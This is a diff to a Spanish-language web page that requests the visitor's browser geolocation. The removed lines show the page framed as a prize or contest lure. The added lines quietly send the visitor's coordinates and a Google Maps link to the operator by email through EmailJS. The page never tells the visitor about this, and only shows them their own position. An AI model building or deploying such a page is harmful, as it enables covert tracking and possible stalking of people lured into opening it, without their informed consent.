@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Compartir Ubicación</title>
+  <title>Compartir Ubicación + EmailJS</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -39,14 +39,20 @@
 </head>
 <body>
 
-   <h1>Recibir Premio</h1>
-  <p>Haz clic en el botón para recibir información de concurso</p>
-  <button onclick="getLocation()">Buscar información</button>
+  <h1>Compartir mi Ubicación</h1>
+  <p>Haz clic en el botón para compartir tu ubicación actual.</p>
+  <button onclick="getLocation()">Compartir Ubicación</button>
 
   <p id="status"></p>
   <p id="location"></p>
 
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
   <script>
+    (function(){
+      emailjs.init("TU_USER_ID_DE_EMAILJS"); // Reemplaza con tu EmailJS User ID
+    })();
+
     function getLocation() {
       const status = document.getElementById('status');
       const locationDisplay = document.getElementById('location');
@@ -62,30 +68,28 @@
         (position) => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
+          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
           status.textContent = 'Ubicación obtenida:';
           locationDisplay.innerHTML = `
             📍 Latitud: ${latitude} <br>
             📍 Longitud: ${longitude} <br><br>
-            <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">
-              Ver en Google Maps
-            </a>
+            <a href="${mapsLink}" target="_blank">Ver en Google Maps</a>
           `;
+
+          // Enviar por correo usando EmailJS
+          emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", {
+            latitud: latitude,
+            longitud: longitude,
+            mapa: mapsLink,
+          }).then(function(response) {
+            console.log("Correo enviado correctamente", response);
+          }, function(error) {
+            console.error("Error al enviar correo", error);
+          });
         },
         (error) => {
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              status.textContent = 'Permiso denegado por el usuario.';
-              break;
-            case error.POSITION_UNAVAILABLE:
-              status.textContent = 'Ubicación no disponible.';
-              break;
-            case error.TIMEOUT:
-              status.textContent = 'Tiempo de espera agotado.';
-              break;
-            default:
-              status.textContent = 'Error desconocido.';
-              break;
-          }
+          status.textContent = 'No se pudo obtener la ubicación.';
         }
       );
     }
